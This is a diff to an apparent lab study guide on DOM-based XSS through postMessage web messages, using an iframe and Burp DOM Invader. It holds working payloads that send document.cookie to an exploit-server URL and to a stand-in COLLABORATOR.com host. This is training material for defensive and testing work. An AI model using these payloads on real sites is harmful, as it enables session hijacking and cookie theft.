@@ -77,9 +77,9 @@ http://exploit-0ac30095035c7526c09ebd7401a00075.exploit-server.net/bs.png/?bd=do
 
 ```html
 <iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
-        type: "load-channel",
-        url:  atob("aHR0cDovL2V4cGxvaXQtMGFjMzAwOTUwMzVjNzUyNmMwOWViZDc0MDFhMDAwNzUuZXhwbG9pdC1zZXJ2ZXIubmV0Lz9iZD1kb2N1bWVudC5jb29raWU=")
-    }), "*");'>
+    "type": "load-channel",
+    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
+}), "*");'>
 
 ```  
 
@@ -88,6 +88,20 @@ http://exploit-0ac30095035c7526c09ebd7401a00075.exploit-server.net/bs.png/?bd=do
 >Identify web messages using **postmessage()** with **DOM Invader**.  
 
 ![DOM Invader identify web messages](images/dom-invader-identify-web-messages.png)  
+
+>Replay post message using DOM Invader.  
+
+```JSON
+{
+    "type": "load-channel",
+    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
+}
+```  
+
+![DOM Invader resend web messages](dom-invader-resend-web-messages.png)  
+  
+[Testing for DOM XSS using web messages](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages)  
+
 
 ## Web Cache Poison  
 
